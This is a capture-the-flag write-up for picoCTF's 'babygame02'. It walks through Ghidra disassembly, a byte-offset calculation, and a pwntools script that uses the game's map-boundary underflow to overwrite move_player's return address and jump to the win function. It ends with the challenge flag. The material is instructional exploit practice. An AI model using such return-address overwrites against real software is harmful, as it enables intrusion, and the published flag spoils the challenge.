# babygame02

## Method

```
Break the game and get the flag.
Welcome to BabyGame 02! Navigate around the map and see what you can find! The game is available to download here.
There is no source available, so you'll have to figure your way around the map. You can connect with it using nc saturn.picoctf.net 59056.
```
**Hint1:** Use 'w','a','s','d' to move around. There may be secret commands to make your life easy.


Similar challenge as to babygame01 grid like structure moving to the final location for the flag but not recieving it.

I shoved it into ghidra like before to see how I could solve it. 

```c
undefined4 main(void)

{
  int iVar1;
  int local_aa8;
  int local_aa4;
  undefined local_a9d [2700];
  char local_11;
  undefined *local_10;
  
  local_10 = &stack0x00000004;
  init_player(&local_aa8);
  init_map(local_a9d,&local_aa8);
  print_map(local_a9d,&local_aa8);
  signal(2,sigint_handler);
  do {
    do {
      iVar1 = getchar();
      local_11 = (char)iVar1;
      move_player(&local_aa8,(int)local_11,local_a9d);
      print_map(local_a9d,&local_aa8);
    } while (local_aa8 != 0x1d);
  } while (local_aa4 != 0x59);
  puts("You win!");
  return 0;
}

```
Glancing at the c function its similar but with 1 glaring issue. We do not have the supposed Test condition for printing the flag.

However it seems the initilizations etc are still the same.
Looking again at the functions like ``init_player`` and ``init_map`` we realise its similar even ``move_player`` they have provided the same function which we can use to cause underflows in the game. **However in this the move_player() function clears the previous position (using '.') before writing the new position meaning we need to find a specific location to overwrite a address directly.**

investigating all functions we finally see the win funciton however it seems as though from our C function there is no possible way to go to it ;-;

---

**Note:**

As discussed before in babygame01 we know memory here is used in the form of a stack where it grows 'downwards' in the memory meaning address decreases as we add more things. Each function has it's own stack frame.

For this stack we have two things ESP (Stack Pointer) and EBP (Base Pointer)

1. ESP (register) the stack pointer points to the top of the stack or the most recently entered value.

2. EBP(register) Serves as a fixed reference point for the current Stack being used.

We also have general purpose registers liek EAX, EBX etc...

---

`` address opcodes(operations) operation function ``
The decompiled assembly in ghidra has this format ^ 

*Note:*

- LEA = Load Effective Address (calculates new address loading it in a register)
- PUSH = pushes a new value onto the stack
- Mov = transfers data from one location to another

---


Win function ->

![image](https://github.com/user-attachments/assets/1a18a1dc-73c7-452f-855b-312ed4555663)

### Coming up with a solution now

Considering the previous game we can traverse acrossss the memory byte by byte And we can change one byte anywhere in the stack with the name of the player as shown before. The easiest way to go about this is changing the move_player's return address to be to the win function's address which is around  ``0804975d`` or greater 

From this we can understand a certain bytes workflow on how to possibly traverse to it.

Looking at main first we start calculating the number of bytes from main first.

![image](https://github.com/user-attachments/assets/95597c34-fa3c-4d93-b1e7-a3be4aa37439)

Statements before this used to setup the stack.

```asm
        0804967e 55              PUSH       EBP
        0804967f 89  e5           MOV        EBP ,ESP
        08049681 53              PUSH       EBX
        08049682 51              PUSH       ECX
        08049683 81  ec  a0       SUB        ESP ,2720
                 0a  00  00
```

Then we can Start looking at move_player

![image](https://github.com/user-attachments/assets/8b014747-64be-43b4-8333-dfe0ca0bc57f)

```asm
        080496f2 83  ec  04       SUB        ESP ,4
        080496f5 8d  95  6b       LEA        EDX => local_a9d ,[EBP  + -2709 ]
                 f5  ff  ff
        080496fb 52              PUSH       EDX
        080496fc 50              PUSH       EAX
        080496fd 8d  85  60       LEA        EAX => local_aa8 ,[EBP  + -2720 ]
                 f5  ff  ff
        08049703 50              PUSH       EAX
        08049704 e8  6b  fd       CALL       move_player                                      undefined move_player(undefined4
                 ff  ff
```

```
EBP // 4 bytes
EBX // 4 bytes
ECX // 4 bytes
^
|
| 2720 Bytes
v
sub 4 // 4 bytes
param EDX (EBP - 2709) // 11 bytes
param EAX // 4 bytes
dont care about param EAX (EBP - 2720) // 0 bytes refers to existing offset
param local_aa8 // 4 bytes
return address (08049709) // 4 bytes
```

From here we start calculating the number of bytes for each statement

- 4 x 3 for the first 3 Lines

- We consider 4 btytes for the sub 4

- Then we have to consider the fact that we move 2709 back up which is 11 bits from the already moved 2720 

- We can then consider 4 x 3 for the last 3 statements for the return address

Adding all of this we get 39 bytes. Meaning we need to underflow 39 bytes from the buffer Array

However after about 4 movements left the program crashed with SIGSEGV (segmentation fault). To which i can assume i had overwritten something important on the stack due to what the player does now hence why it had crashed. As each time we move the player it seems to change the value to ``.`` then move hence overwritting important stuff on the stack. To avoid this i move once up an extra time before moving to the required offset

I then proceeded to change the name of the player to the value that i want to traverse through Looking at the win condition I can understand that i must traverse to the ``08049770`` or any number above that. Like the previous challenge where we had ``@`` there to write to least significant LSB of the register so again we have to do the same this time pointing it directly to 70. In hex 70 to ascii is ``p`` hence we can change the name to p this allows us to underflow whatever comes next with the lsb 70 moving us to it. **P.S I tried values of ``5d`` to 70 but none worked for me and upon trying 70 worked.**

Now from here I underflow 39 bytes (moving me into the return address). After this accounting for the fact that i had to move up an extra once to avoid a fault i can then move down once. Which then returns my flag :D

Script for insta solve:

```python
from pwn import *

p = remote("saturn.picoctf.net", 59056)

p.sendline("aaaawwwww")
p.sendline("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
p.sendline("lp")
p.sendline("s")

p.interactive()
```

## Flag

> picoCTF{gamer_jump1ng_4r0unD_227ec6b0}
